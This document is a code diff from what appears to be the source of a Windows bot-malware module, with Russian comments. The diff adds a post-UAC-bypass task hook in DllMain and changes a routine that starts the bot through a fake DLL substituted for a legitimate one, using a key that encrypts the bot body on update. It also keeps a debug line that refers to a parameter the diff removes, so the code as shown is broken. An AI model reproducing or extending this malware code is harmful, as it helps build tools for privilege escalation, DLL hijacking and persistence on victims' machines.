@@ -242,6 +242,11 @@ BOOL APIENTRY MyDllMain( HMODULE hModule,
 	{
 		case DLL_PROCESS_ATTACH:
 			BOT::Initialize(ProcessUnknown);
+#ifdef UAC_bypassH
+			//смотрим возможно ботплаг запустили после обхода UAC
+			if( ExecTaskAfterUAC() ) return TRUE;
+#endif //UAC_bypassH
+
 			pGetModuleFileNameA( NULL, buf, MAX_PATH );
 			DLLDBG( "MyDllMain", "Start bot.plug in process %s", buf );
 			if( File::GetNameHashA( buf, true ) == 0x490A0972 ) //стартуем если в процессе проводника (explorer.exe)
@@ -302,9 +307,9 @@ DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
 // pathBotPlug - путь в котором находится этот бот
 // pathFakeDll - путь к fake.dll 
 // pathOrigDll - путь к длл которую подменили на fake.dll
-// cryptKey, lenCryptKey - ключ и длина ключа для шифрования тела бота при обновлении
+// cryptKey - ключ для шифрования тела бота при обновлении (строковая строка)
 // эти параметры необходимы для удаления и обновления бота
-BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, const char* pathOrigDll, const char* cryptKey, int lenCryptKey )
+BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, const char* pathOrigDll, const char* cryptKey )
 {
 //	BOT::Initialize();
 	DLLDBG("StartFromFakeDll", "StartFromFakeDll pathBotPlug: '%s', pathFakeDll: '%s', pathOrigDll: '%s'", pathBotPlug, pathFakeDll, pathOrigDll );
@@ -312,9 +317,9 @@ BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, 
 	m_lstrcpy( FakeDllPathBot, pathBotPlug );
 	m_lstrcpy( FakeDllPathDll, pathFakeDll );
 	m_lstrcpy( FakeDllPathOrigDll, pathOrigDll );
-	m_memcpy( FakeDllCryptKey, cryptKey, lenCryptKey );
-	FakeDllLenCryptKey = lenCryptKey;
-	FakeDllCryptKey[lenCryptKey] = 0;
+	FakeDllLenCryptKey = m_lstrlen(cryptKey);
+	m_memcpy( FakeDllCryptKey, cryptKey, FakeDllLenCryptKey );
+	FakeDllCryptKey[FakeDllLenCryptKey] = 0;
 
 	DLLDBG("StartFromFakeDll", "StartFromFakeDll key: '%s', len key: %d", cryptKey, lenCryptKey );
 
